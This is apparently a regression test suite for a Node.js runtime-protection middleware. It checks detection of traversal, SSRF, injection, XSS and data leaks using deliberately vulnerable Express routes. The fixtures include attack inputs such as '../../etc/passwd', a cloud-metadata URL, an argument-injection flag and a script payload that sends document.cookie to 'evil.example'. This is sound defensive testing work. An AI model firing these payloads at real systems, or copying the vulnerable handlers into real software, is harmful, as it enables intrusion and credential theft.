'use strict';

// One case per blind spot that used to let a live attack through unseen. Each
// check names the thing that was invisible rather than the function that fixed
// it, so a regression reads as "cookies are unwatched again" and not as
// "collectCookieHeader returned the wrong shape".

const assert = require('node:assert');
const http = require('node:http');
const vm = require('node:vm');

const shield = require('../index');

const fs = require('node:fs');
const { execFileSync } = require('node:child_process');
const express = require('express');

const { requestTaint, taintedPart, bind, run, current } = require('../src/runtime/context');
const {
  judgeSql, judgeUrl, judgeCode, judgeQuery, judgeArgv, internalHost, normalizeHost,
} = require('../src/runtime/detect');
const { inspectText, judgeHtml, inspectPayload } = require('../src/runtime/response');
const { createLimiter, normalizeClient } = require('../src/runtime/limit');
const { createBaseline } = require('../src/runtime/baseline');

let passed = 0;
const check = (name, fn) => {
  try {
    fn();
    passed += 1;
  } catch (err) {
    console.error(`FAIL  ${name}\n      ${err.message}`);
    process.exitCode = 1;
  }
};

function request(server, path, { method = 'GET', body = null, headers = {} } = {}) {
  const { port } = server.address();
  const payload = body ? JSON.stringify(body) : null;
  return new Promise((resolve, reject) => {
    const req = http.request(
      { host: '127.0.0.1', port, path, method,
        headers: payload
          ? { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload), ...headers }
          : headers },
      (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
      },
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

const listen = (app) => new Promise((resolve) => {
  const server = app.listen(0, '127.0.0.1', () => resolve(server));
});

const HASH = '$2b$12$abcdefghijklmnopqrstuv';

function build(mode) {
  const app = express();
  app.use(express.json());
  app.use(shield.protect({ mode, onFinding: () => {}, feed: false, learn: false }));

  // The cookie header was collected as one string, so a single cookie's value
  // never matched anything a sink was holding.
  // No try/catch around the read: a handler that swallows its own exceptions
  // swallows the refusal with them, and that is a property of the handler
  // rather than of the guard being tested here.
  app.get('/cookie-file', (req, res) => {
    const raw = req.headers.cookie || '';
    const wanted = /theme=([^;]+)/.exec(raw);
    res.type('text/plain').send(fs.readFileSync(`/var/shield-test/${wanted ? wanted[1] : 'notes.txt'}`, 'utf8'));
  });

  // A handler that decodes its own input broke the substring link the taint
  // check relies on.
  app.get('/decoded', (req, res) => {
    const decoded = Buffer.from(String(req.query.blob || ''), 'base64').toString('utf8');
    try {
      res.send(fs.readFileSync(`/var/shield-test/${decoded}`, 'utf8'));
    } catch {
      res.send('missing');
    }
  });

  // axios, got and node-fetch all leave through http.request, which was unhooked.
  app.get('/outbound', (req, res) => {
    try {
      // The hook fires as the request is constructed, so the socket is dropped
      // immediately rather than left hanging on an address with no route.
      const outbound = http.request(String(req.query.url), () => {});
      outbound.on('error', () => {});
      outbound.destroy();
    } catch {
      // an unreachable host is irrelevant here
    }
    res.send('done');
  });

  app.get('/template', (req, res) => {
    try {
      vm.runInNewContext(`const greeting = "${req.query.name}"; greeting`);
    } catch {
      // a syntax error in the injected source is not what is being tested
    }
    res.send('done');
  });

  app.get('/argv', (req, res) => {
    try {
      execFileSync('echo', [String(req.query.flag), 'x']);
    } catch {
      // exit status is irrelevant
    }
    res.send('done');
  });

  // The three ways of sending a body that never reached res.json.
  app.get('/raw-json', (req, res) => {
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ id: 1, password_hash: HASH }));
  });

  app.get('/sent-json', (req, res) => {
    res.type('application/json').send(JSON.stringify({ id: 1, password_hash: HASH }));
  });

  app.get('/streamed-html', (req, res) => {
    res.setHeader('content-type', 'text/html');
    res.write(`<p>${req.query.q}</p>`);
    res.end();
  });

  app.get('/json', (req, res) => {
    res.json({ id: 1, password_hash: HASH });
  });

  app.get('/download', (req, res) => {
    res.sendFile(`/var/shield-test/${req.query.name}`, (err) => {
      if (err && !res.headersSent) res.send('missing');
    });
  });

  // The shape of nearly every real handler: a try/catch around its own I/O,
  // which catches shield's refusal along with the errors it was written for.
  app.get('/swallow', (req, res) => {
    let body = 'missing';
    try {
      body = fs.readFileSync(`/var/shield-test/${req.query.name}`, 'utf8');
    } catch {
      // including ShieldBlocked
    }
    res.json({ body });
  });

  app.use(shield.errorHandler());
  return app;
}

// An app that says where its files are. The syntax rules stand down and
// confinement answers instead.
function buildConfined(mode) {
  const app = express();
  app.use(shield.protect({
    mode, onFinding: () => {}, feed: false, learn: false, verify: false,
    paths: { root: '/var/shield-test' },
  }));

  app.get('/read', (req, res) => {
    res.type('text/plain').send(fs.readFileSync(`/var/shield-test/${req.query.name}`, 'utf8'));
  });

  app.use(shield.errorHandler());
  return app;
}

(async () => {
  fs.mkdirSync('/var/shield-test/sub', { recursive: true });
  fs.writeFileSync('/var/shield-test/notes.txt', 'benign content');

  // ---------- taint sources ----------
  check('a cookie value is request data', () => {
    const taint = requestTaint({ headers: { cookie: 'sid=abc123; theme=../../etc/passwd' } });
    assert.ok(taint.has('../../etc/passwd'), [...taint].join(' | '));
  });

  check('an uploaded filename is request data', () => {
    const taint = requestTaint({ file: { originalname: '../../etc/passwd', mimetype: 'text/plain' } });
    assert.ok(taint.has('../../etc/passwd'));
  });

  check('a base64 payload is matched after the handler decodes it', () => {
    const encoded = Buffer.from('../../etc/passwd').toString('base64');
    const taint = requestTaint({ query: { blob: encoded } });
    assert.strictEqual(taintedPart('/var/data/../../etc/passwd', taint), '../../etc/passwd');
  });

  check('double-encoded traversal is matched after two decodes', () => {
    const taint = requestTaint({ query: { name: '%252e%252e%252fetc' } });
    assert.ok(taint.has('../etc'), [...taint].join(' | '));
  });

  check('a route segment is not treated as an absolute path', () => {
    const taint = requestTaint({ path: '/files/report' });
    assert.ok(!taint.has('/files/report'), 'the joined path would match inside any longer path');
    assert.ok(taint.has('files'));
  });

  // ---------- judges ----------
  check('sql is judged when the driver is handed a config object', () => {
    const taint = new Set(["' OR '1'='1"]);
    assert.ok(judgeSql({ text: "SELECT * FROM users WHERE name = '' OR '1'='1'" }, taint), 'pg form');
    assert.ok(judgeSql({ sql: "SELECT * FROM users WHERE name = '' OR '1'='1'" }, taint), 'mysql2 form');
  });

  check('a parameterised query is still left alone', () => {
    const taint = new Set(["' OR '1'='1"]);
    assert.strictEqual(judgeSql({ text: 'SELECT * FROM users WHERE name = $1', values: ["' OR '1'='1"] }, taint), null);
  });

  check('an address written in decimal is still the loopback', () => {
    assert.strictEqual(normalizeHost('2130706433'), '127.0.0.1');
    assert.ok(internalHost('0x7f000001'));
    assert.ok(internalHost('::ffff:169.254.169.254'));
    assert.ok(internalHost('fd00::1'), 'unique-local IPv6');
    assert.ok(internalHost('metadata.google.internal'));
    assert.ok(!internalHost('example.com'));
  });

  check('http.request options are judged as a url', () => {
    const taint = new Set(['169.254.169.254']);
    const finding = judgeUrl({ hostname: '169.254.169.254', path: '/latest/meta-data', protocol: 'http:' }, taint);
    assert.ok(finding);
    assert.strictEqual(finding.id, 'ssrf');
  });

  check('request data compiled as source is code injection', () => {
    const finding = judgeCode('const x = "";process.exit()//"', new Set(['";process.exit()//']));
    assert.ok(finding);
    assert.strictEqual(finding.id, 'eval');
    assert.strictEqual(finding.severity, 'critical');
  });

  check('a document-store query that carries code is judged', () => {
    const taint = new Set(['this.password.length > 0']);
    const finding = judgeQuery({ $where: 'this.password.length > 0' }, taint);
    assert.ok(finding);
    assert.strictEqual(finding.id, 'nosql-operator');
    assert.strictEqual(judgeQuery({ name: 'alice' }, taint), null, 'ordinary filters are left alone');
  });

  check('a caller-chosen command-line option is argument injection', () => {
    const taint = new Set(['--upload-pack=touch /tmp/x']);
    const finding = judgeArgv(['--upload-pack=touch /tmp/x', 'repo'], taint);
    assert.ok(finding);
    assert.strictEqual(finding.id, 'command');
    assert.strictEqual(judgeArgv(['clone', 'https://example.com/repo'], new Set(['https://example.com/repo'])), null);
  });

  // ---------- response paths ----------
  check('a json body sent as a string is inspected', () => {
    const found = inspectText(JSON.stringify({ password_hash: HASH }), 'application/json');
    assert.strictEqual(found.length, 1, JSON.stringify(found));
    assert.strictEqual(found[0].severity, 'critical');
  });

  check('reflected data inside a script block is xss without a single tag', () => {
    const taint = new Set(['";fetch("//evil.example?c="+document.cookie);//']);
    const body = '<html><script>var q = "";fetch("//evil.example?c="+document.cookie);//";</script></html>';
    const finding = judgeHtml(body, taint, 'text/html');
    assert.ok(finding);
    assert.strictEqual(finding.id, 'xss');
  });

  check('a secret past the two-hundredth row is still found', () => {
    const rows = Array.from({ length: 400 }, (_, i) => ({ id: i }));
    rows[300].password_hash = HASH;
    assert.strictEqual(inspectPayload({ rows }).length, 1);
  });

  // ---------- rate limiting ----------
  check('an IPv6 client cannot become a new client every request', () => {
    assert.strictEqual(normalizeClient('2001:db8:1:2:aaaa::1'), normalizeClient('2001:db8:1:2:bbbb::9'));
    assert.notStrictEqual(normalizeClient('2001:db8:1:2::1'), normalizeClient('2001:db8:9:9::1'));
    assert.strictEqual(normalizeClient('::ffff:127.0.0.1'), '127.0.0.1');
  });

  check('a forwarded chain is counted from the proxy side when hops are given', () => {
    const limiter = createLimiter({ trustProxy: 1 });
    const req = {
      method: 'GET', path: '/x', socket: { remoteAddress: '127.0.0.1' },
      headers: { 'x-forwarded-for': '1.2.3.4, 9.9.9.9' },
    };
    assert.strictEqual(limiter.check(req).ip, '9.9.9.9');
    limiter.stop();
  });

  check('a distributed sign-in run is visible even though no client repeats', () => {
    const limiter = createLimiter({ distributedMax: 40, distributedMinClients: 10 });
    let verdict = null;
    for (let i = 0; i < 60; i += 1) {
      verdict = limiter.check({
        method: 'POST', path: '/login',
        socket: { remoteAddress: `10.0.${Math.floor(i / 250)}.${i % 250}` },
        headers: {},
      });
    }
    assert.ok(verdict && !verdict.ok, 'the endpoint total should have tripped');
    assert.strictEqual(verdict.id, 'distributed-abuse');
    limiter.stop();
  });

  check('an endpoint-wide verdict reports without locking every real user out', () => {
    const limiter = createLimiter({ distributedMax: 10, distributedMinClients: 5 });
    let verdict = null;
    for (let i = 0; i < 20; i += 1) {
      verdict = limiter.check({
        method: 'POST', path: '/login', socket: { remoteAddress: `10.2.0.${i}` }, headers: {},
      });
    }
    assert.strictEqual(verdict.id, 'distributed-abuse');
    assert.strictEqual(verdict.enforce, false, 'refusing everyone at the door is the operator’s call');
    limiter.stop();

    const enforcing = createLimiter({ distributedMax: 10, distributedMinClients: 5, distributedEnforce: true });
    let strict = null;
    for (let i = 0; i < 20; i += 1) {
      strict = enforcing.check({
        method: 'POST', path: '/login', socket: { remoteAddress: `10.3.0.${i}` }, headers: {},
      });
    }
    assert.strictEqual(strict.enforce, true);
    enforcing.stop();
  });

  check('ordinary traffic on a sensitive route is not a distributed attack', () => {
    const limiter = createLimiter();
    const verdicts = [];
    for (let i = 0; i < 30; i += 1) {
      verdicts.push(limiter.check({
        method: 'POST', path: '/login', socket: { remoteAddress: `10.1.0.${i}` }, headers: {},
      }));
    }
    assert.ok(verdicts.every((v) => v.ok), JSON.stringify(verdicts.find((v) => !v.ok)));
    limiter.stop();
  });

  // ---------- baseline ----------
  check('a route is judged while it is still learning, one grade down', () => {
    const baseline = createBaseline({ minSamples: 200, warmupSamples: 20, autosave: false });
    const normal = { method: 'GET', path: '/p', query: { id: '12345' } };
    for (let i = 0; i < 30; i += 1) baseline.observe(normal);

    const findings = baseline.judge({ method: 'GET', path: '/p', query: { id: { $ne: null } } });
    assert.ok(findings.length >= 1, JSON.stringify(findings));
    assert.strictEqual(findings[0].id, 'unexpected-type');
    assert.strictEqual(findings[0].severity, 'medium', 'high, softened while provisional');
    assert.strictEqual(findings[0].provisional, true);
  });

  check('a mature route still judges at full severity', () => {
    const baseline = createBaseline({ minSamples: 10, warmupSamples: 5, autosave: false });
    for (let i = 0; i < 12; i += 1) baseline.observe({ method: 'GET', path: '/p', query: { id: '12345' } });
    const findings = baseline.judge({ method: 'GET', path: '/p', query: { id: { $ne: null } } });
    assert.strictEqual(findings[0].severity, 'high');
    assert.ok(!findings[0].provisional);
  });

  check('a block one process decided on can be applied by another', () => {
    const decisions = [];
    const limiter = createLimiter({ max: 2, windowMs: 1_000, onBlock: (key, until) => decisions.push({ key, until }) });
    const req = { method: 'GET', path: '/x', socket: { remoteAddress: '203.0.113.7' }, headers: {} };
    for (let i = 0; i < 5; i += 1) limiter.check(req);
    assert.strictEqual(decisions.length >= 1, true, 'the decision should be announced once, not per request');
    assert.strictEqual(decisions[0].key, '203.0.113.7');

    // The receiving side: a worker that heard about it, with no traffic of its own.
    const other = createLimiter();
    assert.strictEqual(other.check(req).ok, true, 'unknown client starts clean');
    other.block('203.0.113.7', 60_000);
    const verdict = other.check(req);
    assert.strictEqual(verdict.ok, undefined);
    assert.strictEqual(verdict.id, 'rate-block');
    limiter.stop();
    other.stop();
  });

  check('an empty secret-shaped field is not reported as a leak', () => {
    assert.deepStrictEqual(inspectPayload({ id: 1, password: null, api_key: '' }), []);
    assert.strictEqual(inspectPayload({ id: 1, password: 'hunter2' }).length, 1);
  });

  check('the longest matching fragment is still the one reported', () => {
    const taint = new Set(['etc', '../../etc/passwd', '../../etc']);
    assert.strictEqual(taintedPart('/var/data/../../etc/passwd', taint), '../../etc/passwd');
  });

  // ---------- context propagation ----------
  check('bind carries the request context into work that left it', () => {
    const context = { mode: 'monitor', taint: new Set(), report: () => null };
    let bound = null;
    run(context, () => { bound = bind(() => current()); });
    assert.strictEqual(current(), null, 'outside a request there is no context');
    assert.strictEqual(bound(), context, 'the queued job should still be inspected');
  });

  // ---------- live requests ----------
  const monitor = await listen(build('monitor'));

  shield.clear();
  await request(monitor, '/cookie-file', { headers: { cookie: 'sid=abc123; theme=../../etc/passwd' } });
  check('catches traversal that arrived in a cookie', () => {
    const found = shield.findings();
    assert.strictEqual(found.length, 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'filesystem');
  });

  shield.clear();
  await request(monitor, `/decoded?blob=${encodeURIComponent(Buffer.from('../../etc/passwd').toString('base64'))}`);
  check('catches traversal the handler base64-decoded itself', () => {
    const found = shield.findings();
    assert.strictEqual(found.length, 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'filesystem');
  });

  shield.clear();
  await request(monitor, '/outbound?url=http://169.254.169.254/latest/meta-data');
  check('catches SSRF through http.request, not just fetch', () => {
    const found = shield.findings();
    assert.ok(found.length >= 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'ssrf');
    assert.strictEqual(found[0].call, 'http.request');
  });

  shield.clear();
  await request(monitor, '/template?name=%22%3Bprocess.exit()%2F%2F');
  check('catches request data compiled by vm', () => {
    const found = shield.findings();
    assert.ok(found.length >= 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'eval');
  });

  shield.clear();
  await request(monitor, '/argv?flag=--output%3D%2Ftmp%2Fowned');
  check('catches an argument that is really a flag', () => {
    const found = shield.findings();
    assert.strictEqual(found.length, 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'command');
  });

  shield.clear();
  await request(monitor, '/raw-json');
  check('catches a leak written straight to res.end', () => {
    const found = shield.findings();
    assert.strictEqual(found.length, 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'data-exposure');
  });

  shield.clear();
  await request(monitor, '/sent-json');
  check('catches a leak sent as a json string', () => {
    const found = shield.findings();
    assert.strictEqual(found.length, 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'data-exposure');
  });

  shield.clear();
  await request(monitor, '/streamed-html?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E');
  check('catches reflected markup written through res.write', () => {
    const found = shield.findings();
    assert.strictEqual(found.length, 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'xss');
  });

  shield.clear();
  await request(monitor, '/json');
  check('reports one finding, not one per response method it passed through', () => {
    assert.strictEqual(shield.findings().length, 1, JSON.stringify(shield.findings()));
  });

  shield.clear();
  await request(monitor, '/download?name=../../etc/passwd');
  check('catches traversal handed to res.sendFile', () => {
    const found = shield.findings();
    assert.ok(found.length >= 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'filesystem');
  });

  shield.clear();
  const clean = await request(monitor, '/download?name=notes.txt');
  check('leaves an ordinary download alone', () => {
    assert.deepStrictEqual(shield.findings(), []);
    assert.strictEqual(clean.status, 200);
  });

  monitor.close();

  // ---------- block mode ----------
  const blocking = await listen(build('block'));

  shield.clear();
  const withheld = await request(blocking, '/raw-json');
  check('block mode withholds a leak that was written to res.end', () => {
    assert.strictEqual(withheld.status, 500);
    assert.match(withheld.body, /data-exposure/);
    assert.ok(!withheld.body.includes(HASH), 'the hash must not be in the refusal');
  });

  shield.clear();
  const refused = await request(blocking, '/cookie-file', {
    headers: { cookie: 'theme=../../etc/passwd' },
  });
  check('block mode refuses an attack that arrived in a cookie', () => {
    assert.strictEqual(refused.status, 400);
    assert.match(refused.headers['x-shield-reference'] || '', /^AMS-[0-9A-F]{4}-[0-9A-F]{4}$/);
  });

  shield.clear();
  const ok = await request(blocking, '/download?name=notes.txt');
  check('block mode still serves an ordinary request', () => {
    assert.strictEqual(ok.status, 200);
    assert.strictEqual(ok.body, 'benign content');
  });

  shield.clear();
  const swallowed = await request(blocking, '/swallow?name=../../etc/passwd');
  check('a handler that swallows the refusal does not get to serve the request', () => {
    assert.strictEqual(swallowed.status, 400, swallowed.body);
    assert.match(swallowed.body, /filesystem/);
    assert.ok(!swallowed.body.includes('root:x:'), 'the file must not be in the reply');
  });

  shield.clear();
  const swallowedOk = await request(blocking, '/swallow?name=notes.txt');
  check('swallowing an ordinary error is still fine', () => {
    assert.strictEqual(swallowedOk.status, 200);
    assert.match(swallowedOk.body, /benign content/);
  });

  blocking.close();

  // ---------- declared filesystem roots ----------
  const confined = await listen(buildConfined('monitor'));

  shield.clear();
  const inside = await request(confined, '/read?name=notes.txt');
  check('a path inside the declared root is not a finding', () => {
    assert.deepStrictEqual(shield.findings(), []);
    assert.strictEqual(inside.status, 200);
  });

  shield.clear();
  await request(confined, '/read?name=sub/../notes.txt');
  check('traversal that lands back inside the root is not an escape', () => {
    assert.deepStrictEqual(shield.findings(), [], 'syntax alone should not decide this');
  });

  shield.clear();
  await request(confined, '/read?name=../../etc/passwd');
  check('a path that resolves outside the declared root is', () => {
    const found = shield.findings();
    assert.strictEqual(found.length, 1, JSON.stringify(found));
    assert.strictEqual(found[0].id, 'filesystem');
    assert.match(found[0].detail, /resolves outside/);
  });

  confined.close();

  // ---------- counters ----------
  check('totals survive the ring buffer and say what was dropped', () => {
    const totals = shield.stats();
    assert.ok(totals.reported >= 1, JSON.stringify(totals));
    assert.strictEqual(typeof totals.dropped, 'number');
    assert.ok(totals.byId.filesystem >= 1, JSON.stringify(totals.byId));
  });

  shield.stop();

  console.log(`${passed} passed, ${process.exitCode ? 'some failed' : '0 failed'}`);
})();
